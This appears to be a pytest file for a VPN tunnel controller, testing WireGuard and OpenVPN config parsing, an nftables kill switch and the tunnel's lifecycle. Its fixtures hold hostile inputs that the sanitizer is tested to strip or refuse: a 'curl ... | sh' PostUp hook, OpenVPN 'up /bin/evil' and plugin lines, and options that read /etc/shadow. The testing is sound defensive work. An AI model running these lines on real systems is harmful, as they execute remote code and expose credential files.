"""
Tests for the VPN tunnel (controller/vpn/tunnel.py): config parsing, the kill switch, and that the tunnel is only ever
up behind the kill switch.
"""
import json
import os
import stat
from pathlib import Path
from unittest import mock

import pytest
import yaml

from controller.vpn import tunnel
from controller.vpn.tunnel import Endpoint, Remote, Uplink, VPNConfigError

REPOSITORY = Path(__file__).parent.parent.parent

WIREGUARD = """\
# Provider's comment
[Interface]
PrivateKey = cHJpdmF0ZWtleXByaXZhdGVrZXlwcml2YXRla2V5cHI=
Address = 10.2.0.2/32
Address = fd00::2/128
DNS = 10.2.0.1, search.example
MTU = 1380
PostUp = curl https://example.com/evil | sh

[Peer]
PublicKey = cHVibGlja2V5cHVibGlja2V5cHVibGlja2V5cHVibGk=
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = vpn.example.com:51820
"""

OPENVPN = """\
client
dev tun
proto udp
remote vpn.example.com 1194
remote 198.51.100.7 443 tcp
auth-user-pass
script-security 2
up /etc/openvpn/update-resolv-conf
<connection>
remote other.example.com
proto tcp-client
port 8443
</connection>
<ca>
-----BEGIN CERTIFICATE-----
remote not-a-directive.example.com 1
-----END CERTIFICATE-----
</ca>
"""

UPLINK = Uplink('eth0', '172.18.0.1', None, ['172.18.0.0/16'])


class TestWireGuard:

    def test_parse(self):
        config = tunnel.parse_wireguard(WIREGUARD)
        assert config.addresses == ['10.2.0.2/32', 'fd00::2/128']
        # A search domain is not a DNS server.
        assert config.dns == ['10.2.0.1']
        assert config.mtu == 1380
        assert config.remotes() == [Remote('vpn.example.com', 51820, 'udp')]

    def test_setconf_uses_resolved_endpoint_and_drops_wg_quick_keys(self):
        setconf = tunnel.wireguard_setconf(tunnel.parse_wireguard(WIREGUARD), {'vpn.example.com': ['203.0.113.5']})
        assert 'Endpoint = 203.0.113.5:51820' in setconf
        # wg-quick's keys are applied by the tunnel, and a config's commands are never run.
        for key in ('Address', 'DNS', 'MTU', 'PostUp', 'curl'):
            assert key not in setconf
        assert 'PrivateKey = cHJpdmF0ZWtleXByaXZhdGVrZXlwcml2YXRla2V5cHI=' in setconf
        assert 'AllowedIPs = 0.0.0.0/0, ::/0' in setconf
        # Keeps the provider's NAT mapping (and a forwarded port) open while idle.
        assert f'PersistentKeepalive = {tunnel.DEFAULT_KEEPALIVE}' in setconf

    def test_setconf_keeps_keepalive_and_brackets_ipv6(self):
        text = WIREGUARD.replace('Endpoint = vpn.example.com:51820',
                                 'Endpoint = [2001:db8::5]:51820\nPersistentKeepalive = 10')
        setconf = tunnel.wireguard_setconf(tunnel.parse_wireguard(text), {})
        assert 'Endpoint = [2001:db8::5]:51820' in setconf
        assert 'PersistentKeepalive = 10' in setconf

    def test_setconf_needs_the_controllers_lookup(self):
        with pytest.raises(tunnel.Waiting):
            tunnel.wireguard_setconf(tunnel.parse_wireguard(WIREGUARD), {})

    @pytest.mark.parametrize('text,message', [
        ('', 'no [Interface]'),
        ('[Interface]\nAddress = 10.0.0.2/32\n[Peer]\nPublicKey = a\nEndpoint = h:1\n', 'no PrivateKey'),
        ('[Interface]\nPrivateKey = a\n[Peer]\nPublicKey = a\nEndpoint = h:1\n', 'no Address'),
        ('[Interface]\nPrivateKey = a\nAddress = 10.0.0.2/32\n', 'no [Peer]'),
        ('[Interface]\nPrivateKey = a\nAddress = 10.0.0.2/32\n[Peer]\nPublicKey = a\n', 'no Endpoint'),
        ('[Interface]\nPrivateKey = a\nAddress = 10.0.0.2/32\n[Peer]\nPublicKey = a\nEndpoint = h\n',
         'expected host:port'),
        ('[Interface]\nPrivateKey = a\nAddress = nope\n[Peer]\nPublicKey = a\nEndpoint = h:1\n', 'Address'),
        ('[Wat]\n', 'Unknown WireGuard section'),
    ])
    def test_invalid(self, text, message):
        with pytest.raises(VPNConfigError, match=message.replace('[', r'\[').replace(']', r'\]')):
            tunnel.parse_wireguard(text)


class TestOpenVPN:

    def test_parse_remotes(self):
        config = tunnel.parse_openvpn(OPENVPN)
        assert config.remotes == [
            Remote('vpn.example.com', 1194, 'udp'),
            Remote('198.51.100.7', 443, 'tcp'),
            # A <connection> block's proto and port apply to its own remote only.
            Remote('other.example.com', 8443, 'tcp'),
        ]
        assert config.wants_auth is True

    def test_global_options_apply_to_remotes_above_them(self):
        config = tunnel.parse_openvpn('remote a.example.com\nport 443\nproto tcp\n')
        assert config.remotes == [Remote('a.example.com', 443, 'tcp')]
        assert config.wants_auth is False

    def test_sanitize(self):
        config = tunnel.parse_openvpn(OPENVPN)
        text = tunnel.sanitize_openvpn(config, {'vpn.example.com': ['203.0.113.5', '203.0.113.6'],
                                                'other.example.com': ['203.0.113.9']})
        lines = text.splitlines()
        # Each name becomes its addresses, so OpenVPN never needs DNS behind the kill switch.
        assert 'remote 203.0.113.5 1194 udp' in lines
        assert 'remote 203.0.113.6 1194 udp' in lines
        assert 'remote 198.51.100.7 443 tcp' in lines
        assert 'remote 203.0.113.9 8443 tcp' in lines
        assert not any('vpn.example.com' in line for line in lines)
        # No commands; the tunnel names the device and passes the login itself.
        for dropped in ('script-security', 'up /etc', 'auth-user-pass', 'dev tun'):
            assert not any(line.startswith(dropped) for line in lines), dropped
        # Inline data is passed through untouched.
        assert 'remote not-a-directive.example.com 1' in lines
        assert '<connection>' in lines and '</ca>' in lines

    @pytest.mark.parametrize('text,message', [
        ('client\n', 'no remote'),
        ('remote a.example.com\nhttp-proxy 10.0.0.1 8080\n', 'http-proxy'),
        ('remote a.example.com\ndev tap\n', 'TAP'),
        ('remote a.example.com\nproto sctp\n', 'Unknown OpenVPN protocol'),
    ])
    def test_invalid(self, text, message):
        with pytest.raises(VPNConfigError, match=message):
            tunnel.parse_openvpn(text)

    @pytest.mark.parametrize('line', [
        # OpenVPN un-quotes and un-escapes option names, so these are `up`.
        '"up" /bin/evil', "'up' /bin/evil", 'u\\p /bin/evil', '--"up" /bin/evil',
        # Run commands without needing --script-security.
        'iproute /bin/evil', 'plugin /usr/lib/openvpn/openvpn-plugin-down-root.so /bin/evil', 'engine evil',
        'providers evil',
        # Wrapped in `setenv opt`, an option is still judged as itself.
        'setenv opt iproute /bin/evil',
        # Read or write files as root.
        'askpass /etc/shadow', 'tmp-dir /etc', 'tls-export-cert /etc', 'replay-persist /etc/passwd',
        'ca /etc/shadow', 'tls-auth /etc/shadow 1', 'config /etc/openvpn/other.conf',
        # Unknown options are refused, by name.
        'ignore-unknown-option up', 'management 0.0.0.0 7505',
    ])
    def test_refuses_options_which_could_escape(self, line):
        with pytest.raises(VPNConfigError):
            tunnel.parse_openvpn(f'client\nremote 198.51.100.7\n{line}\n')

    @pytest.mark.parametrize('block', ['auth-user-pass', 'up', 'secret-stuff'])
    def test_refuses_unknown_inline_blocks(self, block):
        with pytest.raises(VPNConfigError, match=f'<{block}>'):
            tunnel.parse_openvpn(f'remote 198.51.100.7\n<{block}>\nx\n</{block}>\n')

    def test_drops_scripts_and_what_the_tunnel_replaces(self):
        text = ('client\nremote 198.51.100.7\nsetenv opt up /bin/evil\nsetenv CLIENT_CERT 0\nverb 1\n'
                'user nobody\nlog /etc/passwd\nblock-outside-dns\ndhcp-option DNS 10.8.0.1\n')
        config = tunnel.parse_openvpn(text)
        lines = tunnel.sanitize_openvpn(config, {}).splitlines()
        assert lines == ['client', 'remote 198.51.100.7 1194 udp', 'setenv CLIENT_CERT 0', 'dhcp-option DNS 10.8.0.1']
        assert config.dns == ['10.8.0.1']

    def test_inline_key_material(self):
        text = 'remote 198.51.100.7\ntls-auth [inline] 1\nkey-direction 1\n<tls-auth>\nkey\n</tls-auth>\n'
        assert '<tls-auth>' in tunnel.sanitize_openvpn(tunnel.parse_openvpn(text), {})

    def test_pushed_dns(self):
        line = ("2026-11-27 PUSH: Received control message: 'PUSH_REPLY,redirect-gateway def1,dhcp-option DNS "
                "10.8.0.1,dhcp-option DNS6 fd00::1,dhcp-option DOMAIN example.com,dns server 0 address 10.8.0.2 "
                "[fd00::2]:53 10.8.0.3:53,route-gateway 10.8.0.1,ifconfig 10.8.0.6 255.255.255.0,peer-id 0'")
        assert tunnel.pushed_dns(line) == ['10.8.0.1', 'fd00::1', '10.8.0.2', 'fd00::2', '10.8.0.3']
        assert tunnel.pushed_dns('Initialization Sequence Completed') == []


class TestKillSwitch:

    def test_drops_everything_but_the_tunnel_and_the_vpn_servers(self):
        ruleset = tunnel.build_ruleset(UPLINK, [Endpoint('203.0.113.5', 51820, 'udp'),
                                                Endpoint('2001:db8::5', 443, 'tcp')])
        assert ruleset.startswith('table inet wrolpi_vpn\ndelete table inet wrolpi_vpn\n')
        for chain in ('input', 'output', 'forward'):
            assert f'type filter hook {chain} priority filter; policy drop;' in ruleset
        assert 'oifname "vpn0" accept' in ruleset
        assert 'oifname "eth0" ip daddr 203.0.113.5 udp dport 51820 accept' in ruleset
        assert 'oifname "eth0" ip6 daddr 2001:db8::5 tcp dport 443 accept' in ruleset
        # WROLPi reaches the torrent WebUI from the uplink's network; the namespace only answers.
        assert f'iifname "eth0" ip saddr 172.18.0.0/16 tcp dport {tunnel.WEBUI_PORT} accept' in ruleset
        assert 'oifname "eth0" ip daddr 172.18.0.0/16 ct state established,related accept' in ruleset
        # Docker's DNS would resolve through the host, around the tunnel.  It is dropped before loopback is allowed.
        output = ruleset[ruleset.index('chain output'):]
        assert output.index('ip daddr 127.0.0.11 drop') < output.index('oifname "lo" accept')

    def test_without_endpoints_nothing_leaves_the_uplink(self):
        ruleset = tunnel.build_ruleset(UPLINK, [])
        output = ruleset[ruleset.index('chain output'):ruleset.index('chain forward')]
        uplink_rules = [line.strip() for line in output.splitlines() if 'oifname "eth0"' in line]
        assert uplink_rules == ['oifname "eth0" ip daddr 172.18.0.0/16 ct state established,related accept']


@pytest.fixture
def media(tmp_path, monkeypatch) -> Path:
    media = tmp_path / 'media'
    (media / 'config' / 'vpn').mkdir(parents=True)
    monkeypatch.setenv('MEDIA_DIRECTORY', str(media))
    return media


def write_settings(media: Path, **vpn):
    (media / 'config' / 'controller.yaml').write_text(yaml.safe_dump({'vpn': vpn}))


def write_endpoints(run_dir: Path, text: str, hosts: dict):
    tunnel.write_json(run_dir / tunnel.ENDPOINTS_FILE, {'config_sha256': tunnel.config_sha256(text), 'hosts': hosts})


class TestPlan:

    def test_disabled(self, media):
        write_settings(media, enabled=False, config_file='vpn/wireguard.conf')
        assert tunnel.make_plan(tunnel.load_settings(media), media / 'config', tunnel.RUN_DIR) is None

    def test_settings_default_without_controller_yaml(self, media):
        assert tunnel.load_settings(media) == tunnel.VPN_DEFAULTS

    def test_waits_for_the_controller_to_look_up_servers(self, media):
        (media / 'config/vpn/wireguard.conf').write_text(WIREGUARD)
        write_settings(media, enabled=True, config_file='vpn/wireguard.conf')
        settings = tunnel.load_settings(media)
        with pytest.raises(tunnel.Waiting):
            tunnel.make_plan(settings, media / 'config', tunnel.RUN_DIR)

        # A lookup of an older config is not used.
        write_endpoints(tunnel.RUN_DIR, 'old config', {'vpn.example.com': ['192.0.2.1']})
        with pytest.raises(tunnel.Waiting):
            tunnel.make_plan(settings, media / 'config', tunnel.RUN_DIR)

        write_endpoints(tunnel.RUN_DIR, WIREGUARD, {'vpn.example.com': ['203.0.113.5']})
        plan = tunnel.make_plan(settings, media / 'config', tunnel.RUN_DIR)
        assert plan.kind == 'wireguard'
        assert plan.endpoints == [Endpoint('203.0.113.5', 51820, 'udp')]

    def test_fingerprint_follows_settings(self, media):
        (media / 'config/vpn/wireguard.conf').write_text(WIREGUARD)
        write_endpoints(tunnel.RUN_DIR, WIREGUARD, {'vpn.example.com': ['203.0.113.5']})
        write_settings(media, enabled=True, config_file='vpn/wireguard.conf')
        first = tunnel.make_plan(tunnel.load_settings(media), media / 'config', tunnel.RUN_DIR)
        write_settings(media, enabled=True, config_file='vpn/wireguard.conf', port_forwarding='fixed',
                       forwarded_port=51413)
        second = tunnel.make_plan(tunnel.load_settings(media), media / 'config', tunnel.RUN_DIR)
        assert first.fingerprint != second.fingerprint

    def test_openvpn_needs_its_login(self, media):
        text = 'remote 198.51.100.7 1194\nauth-user-pass\n'
        (media / 'config/vpn/openvpn.ovpn').write_text(text)
        write_settings(media, enabled=True, config_file='vpn/openvpn.ovpn')
        with pytest.raises(VPNConfigError, match='username and password'):
            tunnel.make_plan(tunnel.load_settings(media), media / 'config', tunnel.RUN_DIR)

        (media / 'config/vpn/openvpn-auth.txt').write_text('user\npass\n')
        write_settings(media, enabled=True, config_file='vpn/openvpn.ovpn', auth_file='vpn/openvpn-auth.txt')
        plan = tunnel.make_plan(tunnel.load_settings(media), media / 'config', tunnel.RUN_DIR)
        assert plan.auth_path == media / 'config/vpn/openvpn-auth.txt'
        assert plan.endpoints == [Endpoint('198.51.100.7', 1194, 'udp')]

    def test_missing_config(self, media):
        write_settings(media, enabled=True, config_file='vpn/wireguard.conf')
        with pytest.raises(VPNConfigError, match='missing'):
            tunnel.make_plan(tunnel.load_settings(media), media / 'config', tunnel.RUN_DIR)


class FakeSystem:
    """Records the tunnel's commands in order; `vpn0` exists once added."""

    def __init__(self):
        self.calls = []
        self.links = set()

    def run(self, *cmd, input_=None):
        cmd = tuple(map(str, cmd))
        self.calls.append(('nft', input_) if cmd[0] == 'nft' else cmd)
        if cmd[:3] == ('ip', 'link', 'add'):
            self.links.add(cmd[3])
        return mock.Mock(stdout='')

    def run_quietly(self, *cmd):
        cmd = tuple(map(str, cmd))
        self.calls.append(cmd)
        if cmd[:3] == ('ip', 'link', 'del'):
            self.links.discard(cmd[3])

    def rulesets(self):
        return [call[1] for call in self.calls if call[0] == 'nft']

    def index(self, prefix):
        return next(i for i, call in enumerate(self.calls) if call[:len(prefix)] == prefix)


@pytest.fixture
def fake_system(monkeypatch):
    system = FakeSystem()
    monkeypatch.setattr(tunnel, 'run', system.run)
    monkeypatch.setattr(tunnel, 'run_quietly', system.run_quietly)
    monkeypatch.setattr(tunnel, 'find_uplink', lambda: UPLINK)
    monkeypatch.setattr(tunnel.Tunnel, 'alive', lambda self: 'vpn0' in system.links)
    monkeypatch.setattr(tunnel.Tunnel, 'connected', lambda self: 'vpn0' in system.links)
    monkeypatch.setattr(tunnel.Tunnel, 'check_public_ip', lambda self: None)
    return system


def read_status() -> dict:
    return json.loads((tunnel.RUN_DIR / tunnel.STATUS_FILE).read_text())


class TestTunnel:

    def make_tunnel(self, media, tmp_path) -> tunnel.Tunnel:
        t = tunnel.Tunnel(media, tunnel.RUN_DIR, tmp_path / 'resolv.conf')
        t.start()
        return t

    def test_starts_locked_down_and_stays_down_while_disabled(self, media, tmp_path, fake_system):
        t = self.make_tunnel(media, tmp_path)
        t.step()
        assert read_status()['state'] == 'disabled'
        assert fake_system.rulesets() == [tunnel.build_ruleset(UPLINK, [])]
        assert 'vpn0' not in fake_system.links

    def test_tunnel_comes_up_behind_the_kill_switch(self, media, tmp_path, fake_system):
        (media / 'config/vpn/wireguard.conf').write_text(WIREGUARD)
        write_endpoints(tunnel.RUN_DIR, WIREGUARD, {'vpn.example.com': ['203.0.113.5']})
        write_settings(media, enabled=True, config_file='vpn/wireguard.conf')
        t = self.make_tunnel(media, tmp_path)
        t.step()

        endpoints = [Endpoint('203.0.113.5', 51820, 'udp')]
        assert fake_system.rulesets()[-1] == tunnel.build_ruleset(UPLINK, endpoints)
        # The kill switch is in place before the tunnel exists, and its server is routed around the tunnel.
        kill_switch = max(i for i, call in enumerate(fake_system.calls) if call[0] == 'nft')
        server_route = fake_system.index(('ip', '-4', 'route', 'replace', '203.0.113.5/32', 'via', '172.18.0.1'))
        link = fake_system.index(('ip', 'link', 'add', 'vpn0', 'type', 'wireguard'))
        default = fake_system.index(('ip', 'route', 'replace', '0.0.0.0/1', 'dev', 'vpn0'))
        assert kill_switch < server_route < link < default
        assert ('ip', '-6', 'route', 'replace', '::/1', 'dev', 'vpn0') in fake_system.calls
        assert ('ip', 'address', 'add', '10.2.0.2/32', 'dev', 'vpn0') in fake_system.calls
        assert ('ip', 'link', 'set', 'dev', 'vpn0', 'mtu', '1380', 'up') in fake_system.calls
        assert (tmp_path / 'resolv.conf').read_text() == 'nameserver 10.2.0.1\n'
        # The private key is only on disk while `wg setconf` reads it.
        assert not (tunnel.RUN_DIR / 'wireguard.conf').exists()

        status = read_status()
        assert status['state'] == 'connected'
        assert status['kind'] == 'wireguard'
        assert status['dns'] == ['10.2.0.1']

        # Nothing changed: the tunnel is left alone.
        calls = len(fake_system.calls)
        t.step()
        assert len(fake_system.calls) == calls

    def test_turning_off_closes_the_kill_switch(self, media, tmp_path, fake_system):
        (media / 'config/vpn/wireguard.conf').write_text(WIREGUARD)
        write_endpoints(tunnel.RUN_DIR, WIREGUARD, {'vpn.example.com': ['203.0.113.5']})
        write_settings(media, enabled=True, config_file='vpn/wireguard.conf')
        t = self.make_tunnel(media, tmp_path)
        t.step()

        write_settings(media, enabled=False, config_file='vpn/wireguard.conf')
        t.step()
        assert 'vpn0' not in fake_system.links
        assert ('ip', '-4', 'route', 'del', '203.0.113.5/32') in fake_system.calls
        assert fake_system.rulesets()[-1] == tunnel.build_ruleset(UPLINK, [])
        assert read_status()['state'] == 'disabled'

    def test_a_failed_tunnel_leaves_nothing_open(self, media, tmp_path, fake_system, monkeypatch):
        (media / 'config/vpn/wireguard.conf').write_text(WIREGUARD)
        write_endpoints(tunnel.RUN_DIR, WIREGUARD, {'vpn.example.com': ['203.0.113.5']})
        write_settings(media, enabled=True, config_file='vpn/wireguard.conf')
        t = self.make_tunnel(media, tmp_path)

        real_run = fake_system.run

        def failing_run(*cmd, input_=None):
            if cmd[:2] == ('wg', 'setconf'):
                raise tunnel.TunnelError('wg setconf failed: Invalid key')
            return real_run(*cmd, input_=input_)

        monkeypatch.setattr(tunnel, 'run', failing_run)
        t.step()
        status = read_status()
        assert status['state'] == 'error'
        assert 'Invalid key' in status['error']
        assert 'vpn0' not in fake_system.links
        assert fake_system.rulesets()[-1] == tunnel.build_ruleset(UPLINK, [])

    def test_waiting_for_server_lookup(self, media, tmp_path, fake_system):
        (media / 'config/vpn/wireguard.conf').write_text(WIREGUARD)
        write_settings(media, enabled=True, config_file='vpn/wireguard.conf')
        t = self.make_tunnel(media, tmp_path)
        t.step()
        status = read_status()
        assert status['state'] == 'waiting'
        assert 'vpn.example.com' in status['error']
        assert fake_system.rulesets() == [tunnel.build_ruleset(UPLINK, [])]

    def test_openvpn_config_is_private_and_run_without_scripts(self, media, tmp_path, fake_system, monkeypatch):
        text = 'client\nremote 198.51.100.7 1194\nup /bin/evil\nscript-security 3\n'
        (media / 'config/vpn/openvpn.ovpn').write_text(text)
        write_settings(media, enabled=True, config_file='vpn/openvpn.ovpn')
        t = self.make_tunnel(media, tmp_path)

        class FakeOpenVPN:
            def __init__(self, cmd):
                self.cmd = cmd
                self.connected = __import__('threading').Event()
                # OpenVPN brings up the device, logs the pushed DNS, then that it is connected.
                fake_system.links.add('vpn0')
                self.dns = ['10.8.0.1']
                self.connected.set()

            def poll(self):
                return None

            def stop(self):
                fake_system.links.discard('vpn0')

        monkeypatch.setattr(tunnel, 'OpenVPNProcess', FakeOpenVPN)
        monkeypatch.setattr(tunnel, 'interface_addresses', lambda interface: ['10.8.0.6/24'])
        monkeypatch.setattr(tunnel.Tunnel, 'alive', lambda self: self.openvpn is not None)
        t.step()

        cmd = t.openvpn.cmd
        # After the config, so they win over it: OpenVPN may run `ip`, never a script.
        assert cmd.index('--script-security') > cmd.index('--config')
        assert cmd[cmd.index('--script-security') + 1] == '1'
        assert '--up' not in cmd
        assert cmd[cmd.index('--dev') + 1] == 'vpn0'
        assert '--route-noexec' in cmd
        config = tunnel.RUN_DIR / tunnel.OPENVPN_CONFIG_FILE
        assert stat.S_IMODE(config.stat().st_mode) == 0o600
        assert '/bin/evil' not in config.read_text()
        assert 'script-security' not in config.read_text()
        assert (tmp_path / 'resolv.conf').read_text() == 'nameserver 10.8.0.1\n'
        status = read_status()
        assert status['state'] == 'connected'
        assert status['addresses'] == ['10.8.0.6/24']

    def test_public_ip_must_be_a_web_address_and_an_address(self, media, tmp_path, monkeypatch):
        t = tunnel.Tunnel(media, tunnel.RUN_DIR, tmp_path / 'resolv.conf')
        t.plan = mock.Mock(settings={'public_ip_url': 'file:///etc/shadow'})
        urlopen = mock.MagicMock()
        monkeypatch.setattr(tunnel.urllib.request, 'urlopen', urlopen)
        t.check_public_ip()
        urlopen.assert_not_called()
        assert t.public_ip is None

        t.plan.settings['public_ip_url'] = 'https://ip.example.com'
        t.public_ip_checked = 0.0
        urlopen.return_value.__enter__.return_value.read.return_value = b'<html>not an address</html>'
        t.check_public_ip()
        assert t.public_ip is None

        t.public_ip_checked = 0.0
        urlopen.return_value.__enter__.return_value.read.return_value = b'203.0.113.99\n'
        t.check_public_ip()
        assert t.public_ip == '203.0.113.99'


class TestInstalled:

    def test_unit_runs_the_tunnel_in_the_namespace(self):
        unit = (REPOSITORY / 'etc/raspberrypios/wrolpi-vpn.service').read_text()
        assert 'ExecStartPre=/opt/wrolpi/etc/raspberrypios/wrolpi-vpn-netns.sh up' in unit
        assert 'ip netns exec wrolpi-vpn /opt/wrolpi/controller/venv/bin/python /opt/wrolpi/controller/vpn/tunnel.py' \
               in unit
        assert '--resolv-conf /etc/netns/wrolpi-vpn/resolv.conf' in unit
        assert os.access(REPOSITORY / 'etc/raspberrypios/wrolpi-vpn-netns.sh', os.X_OK)

    def test_units_installed_and_enabled(self):
        for script in ('repair.sh', 'pi-gen/stage2/04-wrolpi/03-run-chroot.sh',
                       'debian-live-config/config/includes.chroot/usr/local/sbin/wrolpi-bootstrap.sh',
                       'etc/raspberrypios/wrolpi.target'):
            assert 'wrolpi-vpn.service' in (REPOSITORY / script).read_text(), script

    def test_packages(self):
        for packages in ('pi-gen/stage2/04-wrolpi/01-packages-nr',
                         'debian-live-config/config/package-lists/wrolpi.list.chroot'):
            lines = (REPOSITORY / packages).read_text().splitlines()
            for package in ('nftables', 'openvpn', 'wireguard-tools'):
                assert package in lines, (packages, package)
        upgrade = (REPOSITORY / 'scripts/upgrade.sh').read_text()
        assert 'nftables openvpn wireguard-tools' in upgrade

    def test_docker(self):
        dockerfile = (REPOSITORY / 'docker/vpn/Dockerfile').read_text()
        assert 'COPY controller/vpn/tunnel.py /app/tunnel.py' in dockerfile
        for package in ('nftables', 'openvpn', 'wireguard-tools', 'python3-yaml'):
            assert package in dockerfile
        compose = yaml.safe_load((REPOSITORY / 'docker-compose.yml').read_text())
        vpn = compose['services']['vpn']
        assert 'NET_ADMIN' in vpn['cap_add']
        assert 'vpn-run:/run/wrolpi-vpn' in vpn['volumes']
        assert 'vpn-run:/run/wrolpi-vpn' in compose['services']['controller']['volumes']

    def test_standalone(self):
        """The Docker image copies tunnel.py alone, so it imports only the standard library and PyYAML."""
        source = (REPOSITORY / 'controller/vpn/tunnel.py').read_text()
        imports = {line.split()[1].split('.')[0] for line in source.splitlines()
                   if line.startswith(('import ', 'from '))}
        assert 'controller' not in imports
        assert imports - {'yaml'} <= set(__import__('sys').stdlib_module_names)
